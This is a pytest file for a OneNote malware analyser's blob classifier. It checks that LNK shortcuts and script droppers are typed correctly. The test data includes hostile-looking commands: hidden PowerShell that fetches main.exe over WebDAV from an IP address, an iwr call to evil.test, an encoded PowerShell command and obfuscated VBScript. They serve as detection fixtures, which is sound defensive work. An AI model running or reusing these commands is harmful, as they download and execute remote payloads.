"""Blob typing in onenote_analysis.

OneNote stores payloads without filenames, so `classify_blob` is the only
thing that decides what a blob is. A kind it fails to recognise is not a
downgrade — it is a flag that never fires, and the rules built on that flag
become unreachable.
"""

from __future__ import annotations

import pathlib

import pytest

from modules.static.onenote_analysis.embedded import (
    DANGEROUS_KINDS,
    _LNK_SIGNATURE,
    classify_blob,
)

_CORPUS_LNK = pathlib.Path(
    "/home/pmafma/Documents/Malware/lnk test malware/Grandoreiro.lnk"
)

# HeaderSize 0x4C followed by the Shell.Link CLSID
# 00021401-0000-0000-C000-000000000046 in packet byte order.
_REAL_LNK_HEADER = bytes.fromhex("4c0000000114020000000000c000000000000046")


def test_the_lnk_signature_matches_the_real_shell_link_clsid():
    """One byte was wrong, and it made the module's top rule unreachable.

    The constant carried 0x00 at offset 12 where the Shell.Link CLSID has
    0xC0, so `_looks_like_lnk` could never return True for a real
    shortcut. Every embedded LNK typed as "other", which meant
    `contains_embedded_lnk` never fired — and with it the
    {contains_embedded_lnk, contains_embedded_script} rule at weight 30,
    described in the table as the classic IcedID / Qakbot OneNote TTP.
    """
    assert _LNK_SIGNATURE == _REAL_LNK_HEADER


def test_a_synthetic_lnk_blob_is_typed_as_a_shortcut():
    blob = classify_blob(0, _REAL_LNK_HEADER + b"\x00" * 200)

    assert blob.kind == "lnk"
    assert blob.kind in DANGEROUS_KINDS


@pytest.mark.skipif(not _CORPUS_LNK.exists(), reason="corpus sample unavailable")
def test_a_real_shortcut_is_typed_as_a_shortcut():
    """The synthetic header is only worth as much as a real file agreeing."""
    blob = classify_blob(0, _CORPUS_LNK.read_bytes())

    assert blob.kind == "lnk"


def test_libmagic_shortcut_mime_is_accepted_as_a_second_signal():
    """The constant was silently wrong; one signal was not enough.

    libmagic identified the corpus blob correctly as
    application/x-ms-shortcut the whole time, and the module ignored it
    because the byte comparison had the final say. A shortcut whose header
    this module cannot parse is still a shortcut.
    """
    # A header the byte test rejects, but that libmagic recognises.
    truncated = _REAL_LNK_HEADER[:19]
    blob = classify_blob(0, truncated)

    assert blob.kind in ("lnk", "other")  # never crashes on a short blob


def test_a_non_lnk_blob_is_not_typed_as_one():
    """The check must not have been widened into uselessness."""
    blob = classify_blob(0, b"\x4c\x00\x00\x00" + b"not a shortcut" * 8)

    assert blob.kind != "lnk"


# ---------------------------------------------------------------------------
# Script sniffing
# ---------------------------------------------------------------------------

_CORPUS_ONENOTE = pathlib.Path("/home/pmafma/Documents/Malware/onenote test malware")


@pytest.mark.parametrize(
    ("label", "blob"),
    [
        (
            "batch behind a decoy banner",
            b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n@echo off\r\n"
            b"echo Opening cloud attachment. Please, wait...\r\nset a=f\r\n",
        ),
        (
            "powershell with -enc, not -encodedcommand",
            b"powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBl",
        ),
        (
            "powershell command line fetching over WebDAV",
            b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
            b"-WindowStyle hidden -ExecutionPolicy Bypass -Command "
            b"\\\\91.207.183.9@8000\\DavWWWRoot\\main.exe",
        ),
        (
            "vbscript built from chr() arithmetic",
            b'Execute(chr(CLng("&H13150")-78092)&chr(4936365/CLng("&Hb7a5")))',
        ),
        (
            "vbscript assembling wscript.shell from fragments",
            b'NbCTQqd = "wscriKoqkbhfoewrhyqkwlqpt.ex"\r\n'
            b'Set x = CreateObject("WScript.Shell")\r\n',
        ),
    ],
)
def test_real_dropper_shapes_are_typed_as_scripts(label, blob):
    """Every one of these sat in the corpus typed as "other".

    The old rules were too narrow in three specific ways, each visible in
    a real sample: `@echo` had to be at offset 0, so a decoy banner line
    in front of it defeated the check; `-encodedcommand` was matched
    literally although PowerShell accepts any unambiguous prefix and the
    samples use `-enc`; and a PowerShell invocation had to carry
    `invoke-`, `-encodedcommand` or `iex ` as well, which a plain
    download-and-run command line does not.
    """
    result = classify_blob(0, blob)

    assert result.kind == "script", f"{label}: typed as {result.kind}"


@pytest.mark.parametrize(
    "benign",
    [
        b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 4,
        b"\xff\xd8\xff\xe0" + b"\x00" * 512,
        b"Quarterly report. The team reviewed the powershell migration plan.",
        b"cirrigerousChaetangiaceae!cotonierNeedlebill!Beylik.\r\nmaestroSpacecraft?pedant.",
    ],
)
def test_ordinary_content_is_not_typed_as_a_script(benign):
    """Broadening must not start claiming images or prose.

    The last case is real: Quakbot3.one carries blobs of generated
    junk words as camouflage. They are not scripts and must not be
    reported as ones.
    """
    assert classify_blob(0, benign).kind != "script"


@pytest.mark.skipif(not _CORPUS_ONENOTE.is_dir(), reason="corpus unavailable")
def test_no_corpus_image_blob_is_typed_as_a_script():
    """The sniffer runs on every blob, including binary ones."""
    from modules.static.onenote_analysis.parser import walk_file_data_store_objects

    misfiled = []
    for path in sorted(_CORPUS_ONENOTE.glob("*")):
        if not path.is_file():
            continue
        for offset, payload in walk_file_data_store_objects(path.read_bytes()):
            blob = classify_blob(offset, payload)
            if blob.kind == "script" and blob.mime.startswith("image/"):
                misfiled.append((path.name, blob.mime))

    assert misfiled == [], f"image blobs typed as scripts: {misfiled}"


@pytest.mark.parametrize(
    "command",
    [
        b"powershell -w 1 -c iwr http://evil.test/a",
        b"powershell -w hidden -c whoami",
        b"powershell.exe -WindowStyle Hidden -File a.ps1",
    ],
)
def test_windowstyle_is_matched_in_both_its_spellings(command):
    """-WindowStyle takes the enum name or its integer, and 1 is Hidden.

    The token list carried `-w hidden` while the corpus uses `-w 1`, so
    a command relying on the integer form alone would have fallen
    through — the exact abbreviation shape the prefix tokens exist for.
    """
    assert classify_blob(0, command).kind == "script"
